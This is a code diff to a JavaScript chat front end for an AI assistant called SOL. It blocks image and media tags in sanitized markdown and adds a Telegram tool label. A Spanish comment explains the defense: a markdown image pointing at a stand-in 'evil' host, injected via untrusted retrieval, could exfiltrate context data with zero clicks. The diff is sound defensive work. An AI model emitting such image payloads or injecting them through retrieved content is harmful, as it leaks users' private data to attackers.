@@ -5894,6 +5894,12 @@ function parseSolMd(t){
   let html=typeof marked!=='undefined'?(marked.setOptions({breaks:true,gfm:true}),marked.parse(t)):esc(t).replace(/\n/g,'<br>');
   html=DOMPurify.sanitize(html,{
     ADD_ATTR:['target','rel'],
+    // Bloquear <img>/media: un mensaje de SOL nunca renderiza imágenes propias,
+    // y sin esto un `![](https://evil/?d=<dato>)` inyectado por retrieval no
+    // confiable (get_news / search_chats) exfiltra datos del contexto en 0 clicks
+    // al hacer fetch la imagen. Defensa en profundidad.
+    FORBID_TAGS:['img','image','svg','video','audio','source','picture','iframe','embed','object'],
+    FORBID_ATTR:['src','srcset','background','poster','style'],
     ALLOWED_URI_REGEXP:/^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
   });
   // El reemplazo decorativo se hace DESPUÉS del sanitize porque el SVG
@@ -5963,6 +5969,7 @@ const SOL_TOOL_LABELS = {
   generate_docx_report:        {label:'Generando DOCX',                  icon:'📝'},
   send_message_now:            {label:'Enviando mensaje',                icon:'📨'},
   get_user_channels:           {label:'Consultando canales',             icon:'🔌'},
+  connect_telegram:            {label:'Generando link de Telegram',      icon:'📲'},
   plan_route:                  {label:'Armando ruta',                    icon:'🗺️'},
   // Contexto Jarvis
   get_news:                    {label:'Leyendo noticias del mercado',    icon:'📰'},
@@ -6015,6 +6022,8 @@ function solAppendToolChip(toolName, status, result){
       tail = ` <a href="${escAttr(result.deep_link)}" target="_blank" rel="noopener" class="sol-tool-link">Abrir Telegram</a>`;
     } else if (result.found === true && result.name){
       tail = ` · ${escapeHtml(result.name)}${result.phone?' '+escapeHtml(result.phone):''}`;
+    } else if (result.already_connected){
+      tail = ' · ya estaba conectado ✓';
     } else if (result.already_exists){
       tail = ` · ya existía`;
     } else if (result.needs_confirmation){
